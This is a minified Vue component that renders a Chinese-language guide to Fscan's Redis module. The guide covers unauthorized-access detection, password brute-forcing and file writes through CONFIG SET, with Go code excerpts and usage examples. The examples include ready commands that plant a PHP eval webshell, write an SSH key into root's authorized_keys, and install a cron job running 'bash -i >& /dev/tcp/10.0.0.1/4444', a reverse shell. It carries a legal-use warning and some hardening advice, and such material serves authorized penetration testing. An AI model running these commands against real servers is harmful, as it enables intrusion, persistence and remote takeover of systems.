import{_ as f,i as p,r as h,a as c,q as g,b as t,n as s,d as r,e as a,I as i,F as b,g as x,t as l,f as n}from"./index-DADAu9_P.js";const v={class:"flex items-center mb-6"},w={class:"flex items-center mb-2"},_={class:"pl-4 space-y-1"},R=["href"],S={class:"flex"},C={class:"mb-6 grid grid-cols-1 md:grid-cols-2 gap-4"},k={class:"flex items-center mb-2"},F={class:"flex items-center mb-2"},N={class:"flex items-center mb-2"},I={class:"flex items-center mb-2"},T={class:"overflow-x-auto mb-6"},H={class:"mb-4"},O={class:"p-3 text-sm font-mono overflow-x-auto"},W={class:"flex"},G={class:"mb-4"},D={class:"p-3 text-sm font-mono overflow-x-auto"},E={class:"mb-4"},P={class:"p-3 text-sm font-mono overflow-x-auto"},j={class:"mb-4"},M={class:"p-3 text-sm font-mono overflow-x-auto"},A={class:"mb-4"},B={class:"p-3 text-sm font-mono overflow-x-auto"},V={class:"mb-4"},z={class:"p-3 text-sm font-mono overflow-x-auto"},L={class:"mb-4"},U={class:"p-3 text-sm font-mono overflow-x-auto"},$={class:"flex"},q={class:"mb-4"},J={class:"p-3 text-sm font-mono overflow-x-auto"},K={class:"mb-4"},Q={class:"p-3 text-sm font-mono overflow-x-auto"},X={class:"flex"},Y={class:"mb-4"},Z={class:"p-3 text-sm font-mono overflow-x-auto"},tt={class:"mb-4"},rt={class:"p-3 text-sm font-mono overflow-x-auto"},et={class:"mb-4"},st={class:"p-3 text-sm font-mono overflow-x-auto"},ot={class:"mb-4"},nt={class:"p-3 text-sm font-mono overflow-x-auto"},at={class:"mb-4"},it={class:"p-3 text-sm font-mono overflow-x-auto"},dt={class:"mb-4"},lt={class:"p-3 text-sm font-mono overflow-x-auto"},ct={__name:"redis-scan",setup(gt){const e=p("isDark",h(!1)),u=["Redis 扫描简介","扫描原理与流程","配置参数与选项","未授权访问检测","密码爆破","任意文件写入功能","高级设置","应用场景与示例"],y=[{name:"-m redis",description:"启用 Redis 扫描模块",example:"-m redis"},{name:"-p 6379",description:"指定 Redis 端口（默认为 6379）",example:"-p 6379,7379"},{name:"-pwd",description:"指定密码列表，多个用逗号分隔",example:"-pwd redis,admin,123456"},{name:"-rwp",description:"指定要写入的文件路径",example:"-rwp /var/www/html/shell.php"},{name:"-rwc",description:"指定要写入的文件内容",example:'-rwc "<?php phpinfo(); ?>"'},{name:"-rwf",description:"指定从本地读取内容的文件",example:"-rwf local_shell.php"},{name:"-rf",description:"指定 Redis 写入的 SSH 公钥文件",example:"-rf ~/.ssh/id_rsa.pub"},{name:"-rs",description:"指定 Redis 写入的计划任务内容",example:"-rs 10.0.0.1:4444"},{name:"-t",description:"设置并发线程数",example:"-t 50"},{name:"-time",description:"设置单个连接超时时间（秒）",example:"-time 3"},{name:"-timeout",description:"设置全局扫描超时时间（秒）",example:"-timeout 600"},{name:"-noredis",description:"禁用 Redis 安全检测与利用功能",example:"-noredis"}];return(mt,o)=>(g(),c("div",null,[t("div",v,[t("div",{class:s(["w-10 h-10 flex-shrink-0 rounded-lg mr-3 flex items-center justify-center",r(e)?"bg-red-900/30":"bg-red-100"])},[a(r(i),{icon:"mdi:database",class:s(["text-xl",r(e)?"text-red-400":"text-red-600"])},null,8,["class"])],2),t("h1",{class:s(["text-2xl font-bold transition-colors duration-300",r(e)?"text-white":"text-gray-900"])}," Redis 扫描指南 ",2)]),t("div",{class:s(["mb-6 rounded-lg p-3 transition-colors duration-300",r(e)?"bg-gray-800 border border-gray-700":"bg-gray-50 border border-gray-200"])},[t("div",w,[a(r(i),{icon:"mdi:format-list-bulleted",class:s(["mr-2",r(e)?"text-gray-400":"text-gray-500"])},null,8,["class"]),t("h3",{class:s(["font-medium text-sm transition-colors duration-300",r(e)?"text-gray-200":"text-gray-700"])}," 内容概览 ",2)]),t("ul",_,[(g(),c(b,null,x(u,(d,m)=>t("li",{key:m,class:s(["transition-colors duration-200 text-sm font-normal",r(e)?"text-gray-400 hover:text-red-400":"text-gray-600 hover:text-red-600"])},[t("a",{href:`#section-${m}`,class:"hover:underline"},l(d),9,R)],2)),64))])],2),t("div",{class:s(["doc-content transition-colors duration-300",r(e)?"text-gray-300":"text-gray-700"])},[o[0]||(o[0]=t("p",{class:"mb-4"},"Redis 扫描是 Fscan 的重要功能之一，用于发现网络中的 Redis 服务、检测弱密码及未授权访问，并支持多种文件写入功能。本指南详细介绍 Redis 扫描的工作原理、配置选项和最佳实践。",-1)),t("h2",{id:"section-0",class:s(["text-xl font-bold mt-8 mb-4 pb-2 border-b transition-colors duration-300",r(e)?"text-white border-gray-700":"text-gray-800 border-gray-200"])}," Redis 扫描简介 ",2),o[1]||(o[1]=t("p",{class:"mb-4"},"Redis（Remote Dictionary Server）是一种开源的内存数据库，具有高性能、灵活性和广泛的应用场景。Fscan 的 Redis 扫描模块可以：",-1)),o[2]||(o[2]=t("ul",{class:"pl-5 list-disc space-y-2 mb-6"},[t("li",null,"发现内网中开放的 Redis 服务（默认端口 6379）"),t("li",null,"检测 Redis 未授权访问漏洞"),t("li",null,"进行密码爆破"),t("li",null,"利用 Redis 的 CONFIG SET 功能进行任意文件写入"),t("li",null,"支持 SSH 公钥写入和定时任务写入")],-1)),t("div",{class:s(["p-3 rounded-lg mb-6 text-sm font-normal",r(e)?"bg-red-900/10 border border-red-900/20":"bg-red-50 border border-red-100"])},[t("div",S,[a(r(i),{icon:"mdi:shield-alert",class:s(["text-lg flex-shrink-0 mt-0.5 mr-2",r(e)?"text-red-400":"text-red-600"])},null,8,["class"]),t("div",null,[t("p",{class:s(["font-medium",r(e)?"text-red-300":"text-red-700"])},"安全提示",2),t("p",{class:s(["mt-1",r(e)?"text-red-200":"text-red-800"])}," Redis 扫描功能应当仅用于合法的安全测试和授权的渗透测试。未经授权对系统进行扫描与利用可能违反法律法规。 ",2)])])],2),t("h2",{id:"section-1",class:s(["text-xl font-bold mt-8 mb-4 pb-2 border-b transition-colors duration-300",r(e)?"text-white border-gray-700":"text-gray-800 border-gray-200"])}," 扫描原理与流程 ",2),o[3]||(o[3]=t("p",{class:"mb-4"},"Redis 扫描模块采用多阶段扫描策略，高效识别和利用目标系统：",-1)),t("div",C,[t("div",{class:s(["p-4 rounded-lg border transition-colors duration-300",r(e)?"bg-gray-800 border-gray-700":"bg-white border-gray-200"])},[t("div",k,[t("div",{class:s(["w-6 h-6 rounded-md flex items-center justify-center mr-2",r(e)?"bg-green-900/20":"bg-green-100"])},[t("span",{class:s(["text-xs font-bold",r(e)?"text-green-400":"text-green-600"])},"1",2)],2),t("h3",{class:s(["font-medium",r(e)?"text-gray-200":"text-gray-800"])},"服务发现",2)]),t("p",{class:s(["text-sm",r(e)?"text-gray-400":"text-gray-600"])}," 扫描目标 IP 范围，识别开放 Redis 服务（默认端口 6379）的主机 ",2)],2),t("div",{class:s(["p-4 rounded-lg border transition-colors duration-300",r(e)?"bg-gray-800 border-gray-700":"bg-white border-gray-200"])},[t("div",F,[t("div",{class:s(["w-6 h-6 rounded-md flex items-center justify-center mr-2",r(e)?"bg-green-900/20":"bg-green-100"])},[t("span",{class:s(["text-xs font-bold",r(e)?"text-green-400":"text-green-600"])},"2",2)],2),t("h3",{class:s(["font-medium",r(e)?"text-gray-200":"text-gray-800"])},"未授权访问检测",2)]),t("p",{class:s(["text-sm",r(e)?"text-gray-400":"text-gray-600"])}," 尝试无密码连接 Redis，发送 INFO 命令检测服务器是否允许未授权访问 ",2)],2),t("div",{class:s(["p-4 rounded-lg border transition-colors duration-300",r(e)?"bg-gray-800 border-gray-700":"bg-white border-gray-200"])},[t("div",N,[t("div",{class:s(["w-6 h-6 rounded-md flex items-center justify-center mr-2",r(e)?"bg-green-900/20":"bg-green-100"])},[t("span",{class:s(["text-xs font-bold",r(e)?"text-green-400":"text-green-600"])},"3",2)],2),t("h3",{class:s(["font-medium",r(e)?"text-gray-200":"text-gray-800"])},"密码爆破",2)]),t("p",{class:s(["text-sm",r(e)?"text-gray-400":"text-gray-600"])}," 如果无法未授权访问，则使用多线程技术尝试常见密码，支持自动重试和超时控制 ",2)],2),t("div",{class:s(["p-4 rounded-lg border transition-colors duration-300",r(e)?"bg-gray-800 border-gray-700":"bg-white border-gray-200"])},[t("div",I,[t("div",{class:s(["w-6 h-6 rounded-md flex items-center justify-center mr-2",r(e)?"bg-green-900/20":"bg-green-100"])},[t("span",{class:s(["text-xs font-bold",r(e)?"text-green-400":"text-green-600"])},"4",2)],2),t("h3",{class:s(["font-medium",r(e)?"text-gray-200":"text-gray-800"])},"漏洞利用",2)]),t("p",{class:s(["text-sm",r(e)?"text-gray-400":"text-gray-600"])}," 成功访问后，可利用 Redis CONFIG SET 功能进行任意文件写入，包括 SSH 密钥和定时任务 ",2)],2)]),o[4]||(o[4]=t("p",{class:"mb-4"},"内部实现采用高效的协程池管理，确保即使在大规模扫描时也能保持稳定性和性能。扫描过程中会考虑全局超时和单个连接超时，避免资源浪费。",-1)),t("h2",{id:"section-2",class:s(["text-xl font-bold mt-8 mb-4 pb-2 border-b transition-colors duration-300",r(e)?"text-white border-gray-700":"text-gray-800 border-gray-200"])}," 配置参数与选项 ",2),o[5]||(o[5]=t("p",{class:"mb-4"},"Redis 扫描提供多种配置选项，以适应不同的扫描需求：",-1)),t("div",T,[t("table",{class:s(["min-w-full rounded-lg overflow-hidden text-sm font-normal",r(e)?"bg-gray-800 border-gray-700":"bg-white border-gray-200"])},[t("thead",{class:s(r(e)?"bg-gray-850":"bg-gray-50")},[t("tr",null,[t("th",{class:s(["py-3 px-4 text-left font-medium border-b",r(e)?"text-gray-300 border-gray-700":"text-gray-700 border-gray-200"])}," 参数 ",2),t("th",{class:s(["py-3 px-4 text-left font-medium border-b",r(e)?"text-gray-300 border-gray-700":"text-gray-700 border-gray-200"])}," 说明 ",2),t("th",{class:s(["py-3 px-4 text-left font-medium border-b",r(e)?"text-gray-300 border-gray-700":"text-gray-700 border-gray-200"])}," 示例 ",2)])],2),t("tbody",{class:s(["divide-y",r(e)?"divide-gray-700":"divide-gray-200"])},[(g(),c(b,null,x(y,d=>t("tr",{key:d.name,class:s(r(e)?"hover:bg-gray-750":"hover:bg-gray-50")},[t("td",{class:s(["py-2 px-4 font-mono",r(e)?"text-red-400":"text-red-600"])},l(d.name),3),t("td",{class:s(["py-2 px-4",r(e)?"text-gray-300":"text-gray-700"])},l(d.description),3),t("td",{class:s(["py-2 px-4 font-mono",r(e)?"text-gray-400":"text-gray-500"])},l(d.example),3)],2)),64))],2)],2)]),t("h2",{id:"section-3",class:s(["text-xl font-bold mt-8 mb-4 pb-2 border-b transition-colors duration-300",r(e)?"text-white border-gray-700":"text-gray-800 border-gray-200"])}," 未授权访问检测 ",2),o[6]||(o[6]=t("p",{class:"mb-4"},"Redis 未授权访问是常见的安全问题，Fscan 会自动尝试进行无密码连接并发送 INFO 命令进行检测：",-1)),t("div",H,[t("div",{class:s(["rounded-lg overflow-hidden border transition-colors duration-300",r(e)?"border-gray-700 bg-gray-800/50":"border-gray-200 bg-gray-50"])},[t("pre",O,[t("code",{class:s(["transition-colors duration-300",r(e)?"text-gray-100":"text-gray-800"])},`// RedisUnauth 尝试Redis未授权访问检测
func RedisUnauth(ctx context.Context, info *Common.HostInfo) (flag bool, err error) {
    realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
    Common.LogDebug(fmt.Sprintf("开始Redis未授权检测: %s", realhost))

    // 创建带超时的连接
    conn, err := Common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Common.Timeout)*time.Second)
    if err != nil {
        return false, err
    }
    defer conn.Close()

    // 发送info命令测试未授权访问
    if _, err = conn.Write([]byte("info\\r\\n")); err != nil {
        return false, err
    }

    // 读取响应
    reply, err := readreply(conn)
    if err != nil {
        return false, err
    }

    // 检查未授权访问
    if !strings.Contains(reply, "redis_version") {
        return false, nil
    }

    // 发现未授权访问，获取配置
    dbfilename, dir, err = getconfig(conn)

    return true, nil
}`,2)])],2)]),t("div",{class:s(["p-3 rounded-lg mb-6 text-sm font-normal",r(e)?"bg-amber-900/10 border border-amber-900/20":"bg-amber-50 border border-amber-100"])},[t("div",W,[a(r(i),{icon:"mdi:lightbulb",class:s(["text-lg flex-shrink-0 mt-0.5 mr-2",r(e)?"text-amber-400":"text-amber-600"])},null,8,["class"]),t("div",null,[t("p",{class:s(["font-medium",r(e)?"text-amber-300":"text-amber-700"])},"防护提示",2),t("p",{class:s(["mt-1",r(e)?"text-amber-200":"text-amber-800"])}," 防止 Redis 未授权访问的关键措施包括设置强密码、绑定内部 IP 地址、禁用危险命令，以及使用防火墙限制对 Redis 端口的访问。 ",2)])])],2),t("h2",{id:"section-4",class:s(["text-xl font-bold mt-8 mb-4 pb-2 border-b transition-colors duration-300",r(e)?"text-white border-gray-700":"text-gray-800 border-gray-200"])}," 密码爆破 ",2),o[7]||(o[7]=t("p",{class:"mb-4"},"当 Redis 服务启用了密码保护，Fscan 会自动尝试使用内置密码字典进行爆破：",-1)),t("div",G,[t("div",{class:s(["rounded-lg overflow-hidden border transition-colors duration-300",r(e)?"border-gray-700 bg-gray-800/50":"border-gray-200 bg-gray-50"])},[t("pre",D,[t("code",{class:s(["transition-colors duration-300",r(e)?"text-gray-100":"text-gray-800"])},`// concurrentRedisScan 并发扫描Redis服务
func concurrentRedisScan(ctx context.Context, info *Common.HostInfo, credentials []RedisCredential,
                          timeoutMs int64, maxRetries int) *RedisScanResult {
    // 使用ModuleThreadNum控制并发数
    maxConcurrent := Common.ModuleThreadNum
    if maxConcurrent <= 0 {
        maxConcurrent = 10 // 默认值
    }

    // 创建工作池
    var wg sync.WaitGroup
    resultChan := make(chan *RedisScanResult, 1)
    workChan := make(chan RedisCredential, maxConcurrent)

    // 启动工作协程
    for i := 0; i < maxConcurrent; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for credential := range workChan {
                // 尝试Redis认证
                result := tryRedisCredential(ctx, info, credential, timeoutMs, maxRetries)
                if result.Success {
                    resultChan <- result
                    return
                }
            }
        }()
    }

    // 发送工作和等待结果
    // ...
}`,2)])],2)]),o[8]||(o[8]=t("p",{class:"mb-4"},"密码爆破过程使用协程池并发测试多个密码，支持自动重试和超时控制，提高了扫描效率。",-1)),t("h2",{id:"section-5",class:s(["text-xl font-bold mt-8 mb-4 pb-2 border-b transition-colors duration-300",r(e)?"text-white border-gray-700":"text-gray-800 border-gray-200"])}," 任意文件写入功能 ",2),o[9]||(o[9]=t("p",{class:"mb-4"},"Redis 的一个重要安全特性是可以通过 CONFIG SET 命令修改数据库配置，这可能被利用来写入任意文件。Fscan 提供了多种文件写入功能：",-1)),t("h3",{class:s(["text-lg font-semibold mt-5 mb-3 transition-colors duration-300",r(e)?"text-white":"text-gray-800"])}," 1. 任意路径文件写入 ",2),o[10]||(o[10]=t("p",{class:"mb-4"},"通过指定目标路径和内容，实现向目标系统写入自定义文件：",-1)),t("div",E,[t("div",{class:s(["rounded-lg overflow-hidden border transition-colors duration-300",r(e)?"border-gray-700 bg-gray-800/50":"border-gray-200 bg-gray-50"])},[t("pre",P,[t("code",{class:s(["transition-colors duration-300",r(e)?"text-gray-100":"text-gray-800"])},'./fscan -h 192.168.1.10 -p 6379 -m redis -rwp /var/www/html/shell.php -rwc "<?php phpinfo(); ?>"',2)])],2)]),o[11]||(o[11]=t("p",{class:"mb-4"},"内部实现会自动分离目录和文件名，并通过 Redis 的 CONFIG SET 功能写入文件：",-1)),t("div",j,[t("div",{class:s(["rounded-lg overflow-hidden border transition-colors duration-300",r(e)?"border-gray-700 bg-gray-800/50":"border-gray-200 bg-gray-50"])},[t("pre",M,[t("code",{class:s(["transition-colors duration-300",r(e)?"text-gray-100":"text-gray-800"])},`// writeCustomFile 向指定路径写入自定义内容
func writeCustomFile(conn net.Conn, dirPath, fileName, content string) (flag bool, text string, err error) {
    // 设置文件目录
    if _, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir %s\\r\\n", dirPath))); err != nil {
        return flag, text, err
    }
    // 读取响应...

    // 设置文件名
    if _, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename %s\\r\\n", fileName))); err != nil {
        return flag, text, err
    }
    // 读取响应...

    // 写入内容
    safeContent := strings.ReplaceAll(content, "\\"", "\\\\\\"")
    safeContent = strings.ReplaceAll(safeContent, "\\n", "\\\\n")

    if _, err = conn.Write([]byte(fmt.Sprintf("set x \\"%s\\"\\r\\n", safeContent))); err != nil {
        return flag, text, err
    }
    // 读取响应...

    // 保存更改
    if _, err = conn.Write([]byte("save\\r\\n")); err != nil {
        return flag, text, err
    }
    // 读取响应...

    return true, "Success", nil
}`,2)])],2)]),t("h3",{class:s(["text-lg font-semibold mt-5 mb-3 transition-colors duration-300",r(e)?"text-white":"text-gray-800"])}," 2. 从本地文件写入 ",2),o[12]||(o[12]=t("p",{class:"mb-4"},"可以将本地文件的内容写入到目标系统，适用于需要写入大文件或二进制文件的场景：",-1)),t("div",A,[t("div",{class:s(["rounded-lg overflow-hidden border transition-colors duration-300",r(e)?"border-gray-700 bg-gray-800/50":"border-gray-200 bg-gray-50"])},[t("pre",B,[t("code",{class:s(["transition-colors duration-300",r(e)?"text-gray-100":"text-gray-800"])},"./fscan -h 192.168.1.10 -p 6379 -m redis -rwp /var/www/html/shell.php -rwf local_shell.php",2)])],2)]),t("h3",{class:s(["text-lg font-semibold mt-5 mb-3 transition-colors duration-300",r(e)?"text-white":"text-gray-800"])}," 3. SSH 公钥写入 ",2),o[13]||(o[13]=t("p",{class:"mb-4"},"向目标系统写入 SSH 公钥，实现免密登录：",-1)),t("div",V,[t("div",{class:s(["rounded-lg overflow-hidden border transition-colors duration-300",r(e)?"border-gray-700 bg-gray-800/50":"border-gray-200 bg-gray-50"])},[t("pre",z,[t("code",{class:s(["transition-colors duration-300",r(e)?"text-gray-100":"text-gray-800"])},"./fscan -h 192.168.1.10 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub",2)])],2)]),o[14]||(o[14]=t("p",{class:"mb-4"},[n("此功能会尝试将公钥写入到目标系统的 "),t("code",null,"/root/.ssh/authorized_keys"),n(" 文件中。")],-1)),t("h3",{class:s(["text-lg font-semibold mt-5 mb-3 transition-colors duration-300",r(e)?"text-white":"text-gray-800"])}," 4. 定时任务写入 ",2),o[15]||(o[15]=t("p",{class:"mb-4"},"写入反弹Shell的定时任务，建立持久性连接：",-1)),t("div",L,[t("div",{class:s(["rounded-lg overflow-hidden border transition-colors duration-300",r(e)?"border-gray-700 bg-gray-800/50":"border-gray-200 bg-gray-50"])},[t("pre",U,[t("code",{class:s(["transition-colors duration-300",r(e)?"text-gray-100":"text-gray-800"])},"./fscan -h 192.168.1.10 -p 6379 -m redis -rs 10.0.0.1:4444",2)])],2)]),o[16]||(o[16]=t("p",{class:"mb-4"},[n("此功能会尝试将反弹Shell的定时任务写入到目标系统的 cron 目录中，格式为 "),t("code",null,"* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),n("。")],-1)),t("div",{class:s(["p-3 rounded-lg mb-6 text-sm font-normal",r(e)?"bg-green-900/10 border border-green-900/20":"bg-green-50 border border-green-100"])},[t("div",$,[a(r(i),{icon:"mdi:check-circle",class:s(["text-lg flex-shrink-0 mt-0.5 mr-2",r(e)?"text-green-400":"text-green-600"])},null,8,["class"]),t("div",null,[t("p",{class:s(["font-medium",r(e)?"text-green-300":"text-green-700"])},"最佳实践",2),t("p",{class:s(["mt-1",r(e)?"text-green-200":"text-green-800"])}," 在执行文件写入操作后，Fscan 会自动恢复 Redis 的原始配置（dbfilename 和 dir），减少对目标系统的影响。 ",2)])])],2),t("h2",{id:"section-6",class:s(["text-xl font-bold mt-8 mb-4 pb-2 border-b transition-colors duration-300",r(e)?"text-white border-gray-700":"text-gray-800 border-gray-200"])}," 高级设置 ",2),t("h3",{class:s(["text-lg font-semibold mt-5 mb-3 transition-colors duration-300",r(e)?"text-white":"text-gray-800"])}," 线程控制 ",2),o[17]||(o[17]=t("p",{class:"mb-4"},[n("Redis 扫描模块使用 "),t("code",null,"ModuleThreadNum"),n(" 参数控制并发线程数，可以通过 "),t("code",null,"-t"),n(" 参数设置：")],-1)),t("div",q,[t("div",{class:s(["rounded-lg overflow-hidden border transition-colors duration-300",r(e)?"border-gray-700 bg-gray-800/50":"border-gray-200 bg-gray-50"])},[t("pre",J,[t("code",{class:s(["transition-colors duration-300",r(e)?"text-gray-100":"text-gray-800"])},"./fscan -h 192.168.1.0/24 -p 6379 -m redis -t 100",2)])],2)]),o[18]||(o[18]=t("p",{class:"mb-4"},"内部实现会自动根据线程数和凭据数量调整工作池大小，优化资源利用。",-1)),t("h3",{class:s(["text-lg font-semibold mt-5 mb-3 transition-colors duration-300",r(e)?"text-white":"text-gray-800"])}," 超时设置 ",2),o[19]||(o[19]=t("p",{class:"mb-4"},"Redis 扫描支持两层超时控制：",-1)),o[20]||(o[20]=t("ul",{class:"pl-5 list-disc space-y-2 mb-6"},[t("li",null,[t("strong",null,"单个连接超时"),n("：通过 "),t("code",null,"-time"),n(" 参数设置每个 Redis 连接尝试的最大时间（秒）")]),t("li",null,[t("strong",null,"全局超时"),n("：通过 "),t("code",null,"-timeout"),n(" 参数设置整个扫描任务的最大执行时间（秒）")])],-1)),t("div",K,[t("div",{class:s(["rounded-lg overflow-hidden border transition-colors duration-300",r(e)?"border-gray-700 bg-gray-800/50":"border-gray-200 bg-gray-50"])},[t("pre",Q,[t("code",{class:s(["transition-colors duration-300",r(e)?"text-gray-100":"text-gray-800"])},"./fscan -h 192.168.1.10 -p 6379 -m redis -time 3 -timeout 300",2)])],2)]),t("div",{class:s(["p-3 rounded-lg mb-6 text-sm font-normal",r(e)?"bg-amber-900/10 border border-amber-900/20":"bg-amber-50 border border-amber-100"])},[t("div",X,[a(r(i),{icon:"mdi:lightbulb",class:s(["text-lg flex-shrink-0 mt-0.5 mr-2",r(e)?"text-amber-400":"text-amber-600"])},null,8,["class"]),t("div",null,[t("p",{class:s(["font-medium",r(e)?"text-amber-300":"text-amber-700"])},"提示",2),t("p",{class:s(["mt-1",r(e)?"text-amber-200":"text-amber-800"])}," 在扫描大型网络时，合理设置超时参数非常重要。过短的超时可能导致漏报，而过长的超时会降低扫描效率。建议根据网络环境调整这些参数。 ",2)])])],2),t("h2",{id:"section-7",class:s(["text-xl font-bold mt-8 mb-4 pb-2 border-b transition-colors duration-300",r(e)?"text-white border-gray-700":"text-gray-800 border-gray-200"])}," 应用场景与示例 ",2),t("h3",{class:s(["text-lg font-semibold mt-5 mb-3 transition-colors duration-300",r(e)?"text-white":"text-gray-800"])}," 快速扫描整个网段 ",2),t("div",Y,[t("div",{class:s(["rounded-lg overflow-hidden border transition-colors duration-300",r(e)?"border-gray-700 bg-gray-800/50":"border-gray-200 bg-gray-50"])},[t("pre",Z,[t("code",{class:s(["transition-colors duration-300",r(e)?"text-gray-100":"text-gray-800"])},"./fscan -h 192.168.1.0/24 -p 6379 -m redis",2)])],2)]),t("h3",{class:s(["text-lg font-semibold mt-5 mb-3 transition-colors duration-300",r(e)?"text-white":"text-gray-800"])}," 使用自定义密码字典 ",2),t("div",tt,[t("div",{class:s(["rounded-lg overflow-hidden border transition-colors duration-300",r(e)?"border-gray-700 bg-gray-800/50":"border-gray-200 bg-gray-50"])},[t("pre",rt,[t("code",{class:s(["transition-colors duration-300",r(e)?"text-gray-100":"text-gray-800"])},"./fscan -h 192.168.1.10 -p 6379 -m redis -pwd redis123,password,admin123",2)])],2)]),t("h3",{class:s(["text-lg font-semibold mt-5 mb-3 transition-colors duration-300",r(e)?"text-white":"text-gray-800"])}," 写入 WebShell ",2),t("div",et,[t("div",{class:s(["rounded-lg overflow-hidden border transition-colors duration-300",r(e)?"border-gray-700 bg-gray-800/50":"border-gray-200 bg-gray-50"])},[t("pre",st,[t("code",{class:s(["transition-colors duration-300",r(e)?"text-gray-100":"text-gray-800"])},`./fscan -h 192.168.1.10 -p 6379 -m redis -rwp /var/www/html/shell.php -rwc "<?php eval($_POST['cmd']); ?>"`,2)])],2)]),t("h3",{class:s(["text-lg font-semibold mt-5 mb-3 transition-colors duration-300",r(e)?"text-white":"text-gray-800"])}," 写入 SSH 公钥 ",2),t("div",ot,[t("div",{class:s(["rounded-lg overflow-hidden border transition-colors duration-300",r(e)?"border-gray-700 bg-gray-800/50":"border-gray-200 bg-gray-50"])},[t("pre",nt,[t("code",{class:s(["transition-colors duration-300",r(e)?"text-gray-100":"text-gray-800"])},"./fscan -h 192.168.1.10 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub",2)])],2)]),t("h3",{class:s(["text-lg font-semibold mt-5 mb-3 transition-colors duration-300",r(e)?"text-white":"text-gray-800"])}," 写入反弹 Shell 定时任务 ",2),t("div",at,[t("div",{class:s(["rounded-lg overflow-hidden border transition-colors duration-300",r(e)?"border-gray-700 bg-gray-800/50":"border-gray-200 bg-gray-50"])},[t("pre",it,[t("code",{class:s(["transition-colors duration-300",r(e)?"text-gray-100":"text-gray-800"])},"./fscan -h 192.168.1.10 -p 6379 -m redis -rs 10.0.0.1:4444",2)])],2)]),t("h3",{class:s(["text-lg font-semibold mt-5 mb-3 transition-colors duration-300",r(e)?"text-white":"text-gray-800"])}," 禁用 Redis 利用功能 ",2),t("div",dt,[t("div",{class:s(["rounded-lg overflow-hidden border transition-colors duration-300",r(e)?"border-gray-700 bg-gray-800/50":"border-gray-200 bg-gray-50"])},[t("pre",lt,[t("code",{class:s(["transition-colors duration-300",r(e)?"text-gray-100":"text-gray-800"])},"./fscan -h 192.168.1.0/24 -p 6379 -m redis -noredis",2)])],2)]),o[21]||(o[21]=t("p",{class:"mb-4"},[n("使用 "),t("code",null,"-noredis"),n(" 参数可以禁用 Redis 漏洞利用功能，仅执行扫描和认证。")],-1))],2),t("div",{class:s(["mt-8 pt-4 border-t transition-colors duration-300 text-sm",r(e)?"border-gray-700":"border-gray-200"])},[t("a",{href:"https://github.com/shadow1ng/fscan/issues",target:"_blank",class:s(["inline-flex items-center transition-colors duration-200",r(e)?"text-red-400 hover:text-red-300":"text-red-600 hover:text-red-700"])},[a(r(i),{icon:"mdi:github",class:"mr-1.5"}),o[22]||(o[22]=t("span",null,"在 GitHub 上反馈问题",-1))],2)],2)]))}},xt=f(ct,[["__scopeId","data-v-8375d2d8"]]);export{xt as default};
